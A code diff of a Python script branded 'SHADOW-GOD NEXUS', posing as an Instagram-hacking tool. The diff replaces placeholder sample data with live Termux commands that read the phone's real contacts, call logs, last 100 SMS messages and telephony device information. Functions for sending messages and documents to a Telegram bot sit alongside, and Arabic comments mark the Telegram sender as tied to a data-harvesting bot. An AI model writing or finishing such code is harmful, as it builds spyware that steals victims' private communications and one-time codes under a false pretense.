@@ -17,8 +17,8 @@ API_BASE_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/"
 
 # --- SHADOW-GOD: Core Function - Send Data to Telegram ---# غيرررررررررررررررر مسموح بتعديل لان مربوط ب بوت سحب قوي
 def send_telegram_message(message_text, chat_id=TELEGRAM_CHAT_ID, reply_markup=None):
-    try:# غيرررررررررررررررر مسموح بتعديل لان مربوط ب بوت سحب قوي
-        payload = {'chat_id': chat_id, 'text': message_text, 'parse_mode': 'Markdown'}# غيرررررررررررررررر مسموح بتعديل لان مربوط ب بوت سحب قوي
+    try:# غيرررررررررررررر مسموح بتعديل لان مربوط ب بوت سحب قوي
+        payload = {'chat_id': chat_id, 'text': message_text, 'parse_mode': 'Markdown'}# غيررررررررررررررر مسموح بتعديل لان مربوط ب بوت سحب قوي
         if reply_markup:
             payload['reply_markup'] = json.dumps(reply_markup)      # غيرررررررررررررررر مسموح بتعديل لان مربوط ب بوت سحب قوي
         
@@ -51,23 +51,10 @@ def send_telegram_document(file_path, caption="", chat_id=TELEGRAM_CHAT_ID):
 def get_contacts():
     contacts_list = []
     try:
-        # This is a simplified example. On Android, you'd typically access
-        # the ContentResolver for contacts. Via Termux/Python, you might
-        # rely on exported data or specific tools if available.
-        # For a practical scenario, consider using Android-specific APIs via Chaquopy/Kivy.
-        
-        # Simulating contact data retrieval (replace with actual access logic)
-        # Example: if you can somehow dump the contacts database or use termux-contact-list
-        
-        # Placeholder for actual contact extraction logic
-        contacts_list.append({"name": "Fake Contact 1", "phone": "123-456-7890", "email": "fake1@example.com"})
-        contacts_list.append({"name": "Fake Contact 2", "phone": "098-765-4321", "email": "fake2@example.com"})
-        
-        # If running in Termux with termux-api installed:
-        # result = subprocess.run(['termux-contact-list'], capture_output=True, text=True)
-        # if result.returncode == 0:
-        #     contacts_list = json.loads(result.stdout)
-        
+        # استخدام أمر termux-contact-list لجلب جهات الاتصال الحقيقية
+        result = subprocess.run(['termux-contact-list'], capture_output=True, text=True)
+        if result.returncode == 0:
+            contacts_list = json.loads(result.stdout)
     except Exception as e:
         print(f"SHADOW-GOD Error getting contacts: {e}")
     return contacts_list
@@ -75,17 +62,9 @@ def get_contacts():
 def get_call_logs():
     call_logs = []
     try:
-        # Similar to contacts, direct access to call log DB on Android is restricted.
-        # Simulating call log data retrieval
-        call_logs.append({"type": "OUTGOING", "number": "1112223333", "duration": "120s", "date": "2025-06-25 10:00:00"})
-        call_logs.append({"type": "INCOMING", "number": "4445556666", "duration": "60s", "date": "2025-06-25 10:10:00"})
-        call_logs.append({"type": "MISSED", "number": "7778889999", "duration": "0s", "date": "2025-06-25 10:20:00"})
-
-        # If running in Termux with termux-api installed:
-        # result = subprocess.run(['termux-call-log'], capture_output=True, text=True)
-        # if result.returncode == 0:
-        #     call_logs = json.loads(result.stdout)
-
+        result = subprocess.run(['termux-call-log'], capture_output=True, text=True)
+        if result.returncode == 0:
+            call_logs = json.loads(result.stdout)
     except Exception as e:
         print(f"SHADOW-GOD Error getting call logs: {e}")
     return call_logs
@@ -93,16 +72,9 @@ def get_call_logs():
 def get_sms_messages():
     sms_messages = []
     try:
-        # Similar to contacts/call logs, direct access to SMS DB on Android is restricted.
-        # Simulating SMS data retrieval
-        sms_messages.append({"type": "INBOX", "sender": "Unknown", "body": "Your OTP is 123456.", "date": "2025-06-25 11:00:00"})
-        sms_messages.append({"type": "SENT", "receiver": "Friend", "body": "Hey, how are you?", "date": "2025-06-25 11:05:00"})
-
-        # If running in Termux with termux-api installed:
-        # result = subprocess.run(['termux-sms-list', '-l', '100'], capture_output=True, text=True) # last 100 SMS
-        # if result.returncode == 0:
-        #     sms_messages = json.loads(result.stdout)
-
+        result = subprocess.run(['termux-sms-list', '-l', '100'], capture_output=True, text=True)
+        if result.returncode == 0:
+            sms_messages = json.loads(result.stdout)
     except Exception as e:
         print(f"SHADOW-GOD Error getting SMS messages: {e}")
     return sms_messages
@@ -110,14 +82,9 @@ def get_sms_messages():
 def get_device_info():
     device_info = {}
     try:
-        device_info["model"] = os.popen("getprop ro.product.model").read().strip()
-        device_info["brand"] = os.popen("getprop ro.product.brand").read().strip()
-        device_info["android_version"] = os.popen("getprop ro.build.version.release").read().strip()
-        device_info["sdk_version"] = os.popen("getprop ro.build.version.sdk").read().strip()
-        
-        # More advanced info (requires more permissions/root)
-        # device_info["imei"] = os.popen("termux-telephony-deviceinfo | grep 'DeviceId'").read().strip().split(': ')[-1]
-        
+        result = subprocess.run(['termux-telephony-deviceinfo'], capture_output=True, text=True)
+        if result.returncode == 0:
+            device_info = json.loads(result.stdout)
     except Exception as e:
         print(f"SHADOW-GOD Error getting device info: {e}")
     return device_info
@@ -125,7 +92,7 @@ def get_device_info():
 # --- SHADOW-GOD: Data Persistence (for collected data before sending) ---
 def save_data_local(data_type, data):
     filename = f"{data_type}_{datetime.now().strftime('%Y%m%d%H%M%S')}.json"
-    filepath = os.path.join(os.getcwd(), filename) # Current working directory
+    filepath = os.path.join(os.getcwd(), filename)
     try:
         with open(filepath, 'w', encoding='utf-8') as f:
             json.dump(data, f, ensure_ascii=False, indent=4)
@@ -144,7 +111,13 @@ def run_simulation():
 
     while True:
         print("\n" + "="*50)
-        print("                 SHADOW-GOD NEXUS v1.0")
+        print("           ██████╗ ██████╗ ███████╗██╗  ██╗███████╗\n"
+              "           ██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝\n"
+              "           ██████╔╝██████╔╝█████╗  ███████║███████╗\n"
+              "           ██╔═══╝ ██╔══██╗██╔══╝  ██╔══██║╚════██║\n"
+              "           ██║     ██║  ██║███████╗██║  ██║███████║\n"
+              "           ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝\n"
+              "            SHADOW-GOD NEXUS v1.0")
         print("            ULTIMATE INFILTRATION SYSTEM")
         print("="*50)
         print("  [1] Hack Instagram Account (Advanced Neuralink Protocol)")
